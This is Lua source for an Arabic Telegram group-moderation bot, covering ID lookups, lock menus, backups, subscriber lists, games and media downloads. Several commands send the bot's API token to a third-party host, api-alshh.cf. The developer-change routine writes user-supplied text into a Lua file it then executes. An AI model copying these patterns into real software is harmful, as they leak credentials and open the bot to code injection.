'ملاك وناسيك بكروبنه😟',
"حلغوم والله☹️ ",
"اطلق صوره🐼❤️",
"كيكك والله🥺",
"لازك بيها غيرها عاد",
}
local Description = Texting[math.random(#Texting)]
local Get_Is_Id = redis:get(bot_id.."KLISH:ID:bot") or redis:get(bot_id.."Tshakex:Set:Id:Group"..msg.chat_id_)
if not redis:get(bot_id..'Tshakex:Lock:Id:Py:Photo'..msg.chat_id_) then
if yazon.photos_[0] then
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',Add_Mem) 
local Get_Is_Id = Get_Is_Id:gsub('#id',Id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserName_User) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',NumMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',NumMessageEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',Status_Gps) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',Num_Games) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',Total_Photp) 
sendPhoto(msg.chat_id_,msg.id_,yazon.photos_[0].sizes_[1].photo_.persistent_id_,Get_Is_Id)
else
sendPhoto(msg.chat_id_,msg.id_,yazon.photos_[0].sizes_[1].photo_.persistent_id_,'\n•  iD 𖦹 '..Id..'\n•  User Name 𖦹 '..UserName_User..'\n•  Rank 𖦹 '..Status_Gps..'\n•  Msg 𖦹 '..NumMsg..'\n•  Your Title 𖦹 '..lakbk)
end
else
send(msg.chat_id_, msg.id_,'\n•  iD 𖦹 '..Id..'\n•  User Name 𖦹 ['..UserName_User..']\n•  Rank 𖦹 '..Status_Gps..'\n•  Msg 𖦹 '..NumMsg..'\n•  Your Title 𖦹 '..lakbk) 
end
else
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',Add_Mem) 
local Get_Is_Id = Get_Is_Id:gsub('#id',Id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserName_User) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',NumMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',NumMessageEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',Status_Gps) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',Num_Games) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',Total_Photp) 
send(msg.chat_id_, msg.id_,'['..Get_Is_Id..']') 
else
send(msg.chat_id_, msg.id_,'\n•  iD 𖦹 '..Id..'\n•  User Name 𖦹 ['..UserName_User..']\n•  Rank 𖦹 '..Status_Gps..'\n•  Msg 𖦹 '..NumMsg..'\n•  Your Title 𖦹 '..lakbk) 
end
end
end,nil)   
end,nil)   
end

if text == 'ايدي' or text == 'كشف' then
if tonumber(msg.reply_to_message_id_) > 0 then
function Function_Status(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'• الحساب محذوف لا توجد معلوماته ')
return false
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local NumMsg = redis:get(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..data.id_) or 0
local Num_Games = redis:get(bot_id.."Tshakex:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = redis:get(bot_id.."Tshakex:Num:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
send(msg.chat_id_, msg.id_,'\n*•  iD 𖦹 '..Id..'\n•  Msg 𖦹  '..NumMsg..'\n•  User 𖦹  ← *['..UserName_User..']*\n•  Rank 𖦹  ← '..Status_Gps..'*') 
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
return false
end
end
if text and text:match("^ايدي @(.*)$") and not redis:get(bot_id..'Tshakex:Lock:Id:Photo'..msg.chat_id_) or text and text:match("^كشف @(.*)$") and not redis:get(bot_id..'Tshakex:Lock:Id:Photo'..msg.chat_id_) then
local username = text:match("^ايدي @(.*)$") or text:match("^كشف @(.*)$")
function Function_Status(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local NumMsg = redis:get(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..data.id_) or 0
local Num_Games = redis:get(bot_id.."Tshakex:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = redis:get(bot_id.."Tshakex:Num:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
send(msg.chat_id_, msg.id_,'\n*•  iD 𖦹 '..Id..'\n•  Msg 𖦹  '..NumMsg..'\n•  User 𖦹  ← *['..UserName_User..']*\n•  Rank 𖦹  ← '..Status_Gps..'') 
end,nil)   
else
send(msg.chat_id_, msg.id_,'• لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Status, nil)
return false
end
if text =='الاحصائيات' then 
if not DeveloperBot(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
send(msg.chat_id_, msg.id_,'*• عدد الاحصائيات الكامله \n━━━━━━━━\n• عدد المجموعات : '..(redis:scard(bot_id..'Tshakex:ChekBotAdd') or 0)..'\n• عدد المشتركين : '..(redis:scard(bot_id..'Tshakex:Num:User:Pv') or 0)..'*')
end
if text == 'تاك للكل' or text == 'منشن' and Admin(msg) then
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""), offset_ = 0,limit_ = 400},function(ta,yazon)
t = "\n• قائمة الاعضاء \n━━━━━━━━━\n"
local list = yazon.members_
for i=0 ,#list do
tdcli_function ({ID = "GetUser",user_id_ = yazon.members_[i].user_id_},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = yazon.members_[i].user_id_
end
t = t..''..i..'- '..username..' \n '
if #list == i then
send(msg.chat_id_, msg.id_,t)
end
end,nil)
end
end,nil)
end

if text == 'تحويل ملصق' and tonumber(msg.reply_to_message_id_) > 0 then
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(arg,data)
if data.content_.ID == 'MessagePhoto' then
if data.content_.photo_ then
if data.content_.photo_.sizes_[0] then
photo_in_group = data.content_.photo_.sizes_[0].photo_.persistent_id_
end
if data.content_.photo_.sizes_[1] then
photo_in_group = data.content_.photo_.sizes_[1].photo_.persistent_id_
end
if data.content_.photo_.sizes_[2] then
photo_in_group = data.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if data.content_.photo_.sizes_[3] then
photo_in_group = data.content_.photo_.sizes_[3].photo_.persistent_id_
end
end
local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..photo_in_group) ) 
local Name_File = download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, './'..msg.id_..'.webp') 
sendSticker(msg.chat_id_,msg.id_,Name_File)
os.execute('rm -rf '..Name_File) 
else
send(msg.chat_id_,msg.id_,'هذه ليست صوره')
end
end, nil)
end
if text == 'صوره' and tonumber(msg.reply_to_message_id_) > 0 then
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(arg,data)
if data.content_.ID == "MessageSticker" then    
local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..data.content_.sticker_.sticker_.persistent_id_) ) 
local Name_File = download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, './'..msg.id_..'.jpg') 
sendPhoto(msg.chat_id_,msg.id_,Name_File,'')
os.execute('rm -rf '..Name_File) 
else
send(msg.chat_id_,msg.id_,'هذا ليس ملصق')
end
end, nil)
end
if text == 'تغير المطور الاساسي' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:set(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,' ارسل الان معرف المطور الاساسي الجديد')
return false
end
if text and redis:get(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_) then
if text == 'الغاء' then 
redis:del(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_)
send(msg.chat_id_, msg.id_,' تم الغاء تغير المطور الاساسي')
return false
end
local username = text:gsub('@','')
tdcli_function ({ID = "SearchPublicChat",username_ = username}, function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي هذا معرف قناة يرجى ارسال المعرف مره اخره")   
return false 
end      
local file_Info_Sudo = io.open("Info_Sudo.lua", 'w')
file_Info_Sudo:write([[
do 
local File_Info = {
id_dev = "]]..result.id_..[[",
UserName_dev = "]]..username..[[",
Token_Bot = "]]..token..[["
}
return File_Info
end
]])
file_Info_Sudo:close()
else
send(msg.chat_id_, msg.id_, '• لا يوجد حساب بهذا المعرف')
end
end, nil)
redis:del(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'تم تغير المطور الاساسي \n الرجاء ارسل امر [تحديث]')
dofile('Info_Sudo.lua')  
return false
end

if text == 'رفع نسخه الاحتياطيه' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'رفع المشتركين' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
local info_file = io.open('./users.json', "r"):read('*a')
local users = JSON.decode(info_file)
for k,v in pairs(users.users) do
redis:sadd(bot_id..'Tshakex:Num:User:Pv',v) 
end
send(msg.chat_id_,msg.id_,'تم رفع :'..#users.users..' مشترك ')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
if text == 'جلب المشتركين' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
local list = redis:smembers(bot_id..'Tshakex:Num:User:Pv')  
local t = '{"users":['  
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end
t = t..']}'
local File = io.open('./users.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, './users.json', 'عدد المشتركين :'..#list)
end 

if text == 'جلب نسخه الاحتياطيه' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
GetFile_Bot(msg)
end
if text == 'اوامر القفل' and Admin(msg) then
local Texti = 'تستطيع قفل وفتح عبر الازرار'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'قفل الاضافه', callback_data=msg.sender_user_id_.."/lockjoine"},{text = 'فتح الاضافه', callback_data=msg.sender_user_id_.."/unlockjoine"},
},
{
{text = 'قفل الدردشه', callback_data=msg.sender_user_id_.."/lockchat"},{text = 'فتح الدردشه', callback_data=msg.sender_user_id_.."/unlockchat"},
},
{
{text = 'قفل الدخول', callback_data=msg.sender_user_id_.."/lock_joine"},{text = 'فتح الدخول', callback_data=msg.sender_user_id_.."/unlock_joine"},
},
{
{text = 'قفل البوتات', callback_data=msg.sender_user_id_.."/lockbots"},{text = 'فتح البوتات', callback_data=msg.sender_user_id_.."/unlockbots"},
},
{
{text = 'قفل الاشعارات', callback_data=msg.sender_user_id_.."/locktags"},{text = 'فتح الاشعارات', callback_data=msg.sender_user_id_.."/unlocktags"},
},
{
{text = 'قفل التعديل', callback_data=msg.sender_user_id_.."/lockedit"},{text = 'فتح التعديل', callback_data=msg.sender_user_id_.."/unlockedit"},
},
{
{text = 'قفل الروابط', callback_data=msg.sender_user_id_.."/locklink"},{text = 'فتح الروابط', callback_data=msg.sender_user_id_.."/unlocklink"},
},
{
{text = 'قفل المعرفات', callback_data=msg.sender_user_id_.."/lockusername"},{text = 'فتح المعرفات', callback_data=msg.sender_user_id_.."/unlockusername"},
},
{
{text = 'قفل التاك', callback_data=msg.sender_user_id_.."/locktag"},{text = 'فتح التاك', callback_data=msg.sender_user_id_.."/unlocktag"},
},
{
{text = 'قفل الملصقات', callback_data=msg.sender_user_id_.."/locksticar"},{text = 'فتح الملصقات', callback_data=msg.sender_user_id_.."/unlocksticar"},
},
{
{text = 'قفل المتحركه', callback_data=msg.sender_user_id_.."/lockgif"},{text = 'فتح المتحركه', callback_data=msg.sender_user_id_.."/unlockgif"},
},
{
{text = 'قفل الفيديو', callback_data=msg.sender_user_id_.."/lockvideo"},{text = 'فتح الفيديو', callback_data=msg.sender_user_id_.."/unlockvideo"},
},
{
{text = 'قفل الصور', callback_data=msg.sender_user_id_.."/lockphoto"},{text = 'فتح الصور', callback_data=msg.sender_user_id_.."/unlockphoto"},
},
{
{text = 'قفل الاغاني', callback_data=msg.sender_user_id_.."/lockvoise"},{text = 'فتح الاغاني', callback_data=msg.sender_user_id_.."/unlockvoise"},
},
{
{text = 'قفل الصوت', callback_data=msg.sender_user_id_.."/lockaudo"},{text = 'فتح الصوت', callback_data=msg.sender_user_id_.."/unlockaudo"},
},
{
{text = 'قفل التوجيه', callback_data=msg.sender_user_id_.."/lockfwd"},{text = 'فتح التوجيه', callback_data=msg.sender_user_id_.."/unlockfwd"},
},
{
{text = 'قفل الملفات', callback_data=msg.sender_user_id_.."/lockfile"},{text = 'فتح الملفات', callback_data=msg.sender_user_id_.."/unlockfile"},
},
{
{text = 'قفل الجهات', callback_data=msg.sender_user_id_.."/lockphone"},{text = 'فتح الجهات', callback_data=msg.sender_user_id_.."/unlockphone"},
},
{
{text = 'قفل الكلايش', callback_data=msg.sender_user_id_.."/lockposts"},{text = 'فتح الكلايش', callback_data=msg.sender_user_id_.."/unlockposts"},
},
{
{text = 'قفل التكرار', callback_data=msg.sender_user_id_.."/lockflood"},{text = 'فتح التكرار', callback_data=msg.sender_user_id_.."/unlockflood"},
},
{
{text = 'قفل الفارسيه', callback_data=msg.sender_user_id_.."/lockfarse"},{text = 'فتح الفارسيه', callback_data=msg.sender_user_id_.."/unlockfarse"},
},
{
{text = 'قفل السب', callback_data=msg.sender_user_id_.."/lockfshar"},{text = 'فتح السب', callback_data=msg.sender_user_id_.."/unlockfshar"},
},
{
{text = 'قفل الانجليزيه', callback_data=msg.sender_user_id_.."/lockenglish"},{text = 'فتح الانجليزيه', callback_data=msg.sender_user_id_.."/unlockenglish"},
},
{
{text = 'قفل الانلاين', callback_data=msg.sender_user_id_.."/lockinlene"},{text = 'فتح الانلاين', callback_data=msg.sender_user_id_.."/unlockinlene"},
},

}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'اوامر التعطيل' and Owner(msg) then
local Texti = 'تستطيع تعطيل وتفعيل عبر الازرار'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعطيل التنزيل', callback_data=msg.sender_user_id_.."/lockdul"},{text = 'تفعيل التنزيل', callback_data=msg.sender_user_id_.."/unlockdul"},
},
{
{text = 'تعطيل الرابط', callback_data=msg.sender_user_id_.."/lock_links"},{text = 'تفعيل الرابط', callback_data=msg.sender_user_id_.."/unlock_links"},
},
{
{text = 'تعطيل صورتي', callback_data=msg.sender_user_id_.."/lockmyphoto"},{text = 'تفعيل صورتي', callback_data=msg.sender_user_id_.."/unlockmyphoto"},
},
{
{text = 'تعطيل الترحيب', callback_data=msg.sender_user_id_.."/lockwelcome"},{text = 'تفعيل الترحيب', callback_data=msg.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'تعطيل الردود العامه', callback_data=msg.sender_user_id_.."/lockrepall"},{text = 'تفعيل الردود العامه', callback_data=msg.sender_user_id_.."/unlockrepall"},
},
{
{text = 'تعطيل الايدي', callback_data=msg.sender_user_id_.."/lockide"},{text = 'تفعيل الايدي', callback_data=msg.sender_user_id_.."/unlockide"},
},
{
{text = 'تعطيل الايدي بالصوره', callback_data=msg.sender_user_id_.."/lockidephoto"},{text = 'تفعيل الايدي بالصوره', callback_data=msg.sender_user_id_.."/unlockidephoto"},
},
{
{text = 'تعطيل الحظر', callback_data=msg.sender_user_id_.."/lockkiked"},{text = 'تفعيل الحظر', callback_data=msg.sender_user_id_.."/unlockkiked"},
},
{
{text = 'تعطيل الرفع', callback_data=msg.sender_user_id_.."/locksetm"},{text = 'تفعيل الرفع', callback_data=msg.sender_user_id_.."/unlocksetm"},
},
{
{text = 'تعطيل ضافني', callback_data=msg.sender_user_id_.."/lockaddme"},{text = 'تفعيل ضافني', callback_data=msg.sender_user_id_.."/unlockaddme"},
},
{
{text = 'تعطيل صيح', callback_data=msg.sender_user_id_.."/locksehe"},{text = 'تفعيل صيح', callback_data=msg.sender_user_id_.."/unlocksehe"},
},
{
{text = 'تعطيل اطردني', callback_data=msg.sender_user_id_.."/lockkikedme"},{text = 'تفعيل اطردني', callback_data=msg.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'تعطيل الالعاب', callback_data=msg.sender_user_id_.."/lockgames"},{text = 'تفعيل الالعاب', callback_data=msg.sender_user_id_.."/unlockgames"},
},
{
{text = 'تعطيل الردود', callback_data=msg.sender_user_id_..msg.sender_user_id_.."/lockrepgr"},{text = 'تفعيل الردود', callback_data=msg.sender_user_id_.."/unlockrepgr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'تنزيل الكل' and Owner(msg) then
redis:del(bot_id.."Tshakex:Manager:Group"..msg.chat_id_)
redis:del(bot_id.."Tshakex:Admin:Group"..msg.chat_id_)
redis:del(bot_id.."Tshakex:Vip:Group"..msg.chat_id_)
return send(msg.chat_id_, msg.id_, "•  تم مسح جميع رتب المجموعه")
end
if text and text:match('^ترجم (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^ترجم (.*)$') 
local trg = https.request('https://api-alshh.cf/API/trgm.php?FROM=auto&TO=ar&TEXT='..URL.escape(Ttext))
send(msg.chat_id_, msg.id_, trg)
end
if text and text:match('^طقس (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^طقس (.*)$') 
local taks = https.request('https://api-alshh.cf/API/wether.php?cry='..Ttext)
local zxe = JSON.decode(taks)
send(msg.chat_id_, msg.id_, '• حالة الجو : '..zxe.result.condition..'\n• درجة الحراره : '..zxe.result.temp_c)
end
if text == 'الالعاب' then
send(msg.chat_id_, msg.id_,[[
قائمة الألعاب في البوت
• معاني .
• حزوره .  
• العكس .
• محيبس .
• المختلف .
• رياضيات .
• كت تويت .
• تخمين .
• مقالات .
• انجليزي .
]])
end
if text == 'تغير شكل السورس' and Dev_Bots(msg) then
redis:set(bot_id..'Tshakex:new:sourse'..msg.chat_id_..msg.sender_user_id_,'true1') 
send2(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n ━━━━━━━━')
return false
end
if redis:get(bot_id..'Tshakex:new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true1' then
redis:set(bot_id..'Tshakex:new:sourse1',text)
send2(msg.chat_id_, msg.id_, 'الان ارسل رمز بدلا عن • ')
redis:set(bot_id..'Tshakex:new:sourse'..msg.chat_id_..msg.sender_user_id_,'true2') 
return false
end
if redis:get(bot_id..'Tshakex:new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true2' then
redis:set(bot_id..'Tshakex:new:sourse2',text)
redis:del(bot_id..'Tshakex:new:sourse'..msg.chat_id_..msg.sender_user_id_) 
send(msg.chat_id_, msg.id_, 'تم تغير شكل السورس')
return false
end
if text == 'حذف شكل السورس' and Dev_Bots(msg) then
redis:del(bot_id..'Tshakex:new:sourse1')
redis:del(bot_id..'Tshakex:new:sourse2')
send(msg.chat_id_, msg.id_, 'تم حظف تغير شكل السورس')
end
if text == 'كشف المجموعه' and Owner(msg) then
local list1 = redis:smembers(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_)
local list2 = redis:smembers(bot_id.."Tshakex:Manager:Group"..msg.chat_id_)
local list3 = redis:smembers(bot_id.."Tshakex:Admin:Group"..msg.chat_id_)
local list4 = redis:smembers(bot_id.."Tshakex:Manager:Group"..msg.chat_id_)
if #list1 == 0 and #list2 == 0 and #list3 == 0 and #list4 == 0 then
return send(msg.chat_id_, msg.id_,'• لا يوجد رتب هنا')
end 
local list = redis:smembers(bot_id.."Tshakex:Vips:Group"..msg.chat_id_)
if #list ~= 0 then
vips = "\n• قائمة المميزين في المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
vips = vips..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, vips)
end
end,nil)
end
end
local list = redis:smembers(bot_id.."Tshakex:Admin:Group"..msg.chat_id_)
if #list ~= 0 then
Admin = "\n• قائمة الادمنيه في المجموعه\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Admin = Admin..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Admin)
end
end,nil)
end
end
local list = redis:smembers(bot_id.."Tshakex:Manager:Group"..msg.chat_id_)
if #list ~= 0 then
mder = "\n• قائمة المدراء المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
mder = mder..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, mder)
end
end,nil)
end
end
local list = redis:smembers(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_)
if #list ~= 0 then
Monsh = "\n• قائمة منشئين المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Monsh = Monsh..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Monsh)
end
end,nil)
end
end
end
if text and text:match('^iv (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^iv (.*)$') 
local instagram = https.request('https://api-alshh.cf/API/instagram.php?url='..Ttext)
local zxe = JSON.decode(instagram)
if zxe.url then
local msgin = msg.id_/2097152/0.5 
sendvideoURL(msg.chat_id_,msgin, zxe.url, '','md')
end
end
if text and text:match('^ip (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^ip (.*)$') 
local instagram = https.request('https://api-alshh.cf/API/instagram.php?url='..Ttext)
local zxe = JSON.decode(instagram)
if zxe.url then
local msgin = msg.id_/2097152/0.5 
sendPhotoURL(msg.chat_id_,msgin, zxe.url, '','md')
end
end
if text and text:match('^sn (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^sn (.*)$') 
local Soundcloud = https.request('https://api-alshh.cf/API/Soundcloud.php?url='..Ttext)
local zxe = JSON.decode(Soundcloud)
if zxe.response.audios then
for k,v in pairs(zxe.response.audios) do
local Name_File = download(v.url,'./'..msg.id_..'.mp3') 
sendAudio(msg.chat_id_,msg.id_,Name_File,v.description)   
os.execute('rm -rf '..Name_File) 
end
end
end
if text and text:match('^tw (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^tw (.*)$') 
local Soundcloud = https.request('https://api-alshh.cf/API/Soundcloud.php?url='..Ttext)
local zxe = JSON.decode(Soundcloud)
if zxe.response.videos then
for k,v in pairs(zxe.response.videos) do
if k == 1 then
local msgin = msg.id_/2097152/0.5 
sendvideoURL(msg.chat_id_,msgin, v.url, '','md')
end
end
end
end

if text and text:match('^sp (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^sp (.*)$') 
local Soundcloud = https.request('https://api-alshh.cf/API/snap.php?user='..Ttext)
local zxe = JSON.decode(Soundcloud)
if zxe.result.video then
for k,v in pairs(zxe.result.video) do
local msgin = msg.id_/2097152/0.5 
sendvideoURL(msg.chat_id_,msgin, v, '','md')
end
end
end
if text and text:match('^s (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then                        
local Ttext = text:match('^s (.*)$') 
local Soundcloud = https.request('https://api-alshh.cf/API/snap.php?user='..Ttext)
local zxe = JSON.decode(Soundcloud)
if zxe.result.photo then
for k,v in pairs(zxe.result.photo) do
local msgin = msg.id_/2097152/0.5 
sendPhotoURL(msg.chat_id_,msgin, v, '','md')
end
end
end

if text == 'تفعيل التنزيل' and Admin(msg) then   
redis:del(bot_id..'dw:bot:api'..msg.chat_id_) 
Text = '\n تم تفعيل التنزيلات' 
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التنزيل' and Admin(msg) then  
redis:set(bot_id..'dw:bot:api'..msg.chat_id_,true) 
Text = '\nتم تعطيل التنزيلات' 
send(msg.chat_id_, msg.id_,Text) 
end 
if text and text:match('^(.*) !!$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then            
local Ttext = text:match('^(.*) !!$') 
local ytddl = https.request('https://api-alshh.cf/API/sr.php?search='..URL.escape(Ttext))
local zxe = JSON.decode(ytddl)
for k,v in pairs(zxe.results) do
if k == 1 then
local msgin = msg.id_/2097152/0.5 
https.request('https://api-alshh.cf/API/yt.php?url='..v.url..'&token='..token..'&chat='..msg.chat_id_..'&type=mp3&msg='..msgin)
end
end
end
if text and text:match('^(.*) ؟؟$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then            
local Ttext = text:match('^(.*) ؟؟$') 
local ytddl = https.request('https://api-alshh.cf/API/sr.php?search='..URL.escape(Ttext))
local zxe = JSON.decode(ytddl)
for k,v in pairs(zxe.results) do
if k == 1 then
local msgin = msg.id_/2097152/0.5 
https.request('https://api-alshh.cf/API/yt.php?url='..v.url..'&token='..token..'&chat='..msg.chat_id_..'&type=mp4&msg='..msgin)
end
end
end
if text and text:match('^بحث (.*)$') and not redis:get(bot_id..'dw:bot:api'..msg.chat_id_) then      
local Ttext = text:match('^بحث (.*)$') 
local msgin = msg.id_/2097152/0.5 
https.request('https://api-alshh.cf/API/tahaj200.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
redis:set(bot_id..'userusing:yt'..msg.chat_id_..':'..msg.sender_user_id_,'set')
end
if text == 'بصمه' and tonumber(msg.reply_to_message_id_) > 0 then
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(arg,data)
if data.content_.ID == "MessageAudio" then    
local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..data.content_.audio_.audio_.persistent_id_) ) 
local Name_File = download('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, './'..msg.id_..'.ogg') 
sendVoice(msg.chat_id_,msg.id_,Name_File,'')
os.execute('rm -rf '..Name_File) 
else
send(msg.chat_id_,msg.id_,'هاذا ليس ملف صوتي')
end
end, nil)
end
if text and text:match('حول (.*)') and tonumber(msg.reply_to_message_id_) > 0 then
local title = text:match('حول (.*)')
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(arg,data)
if data.content_.ID == "MessageAudio" then    
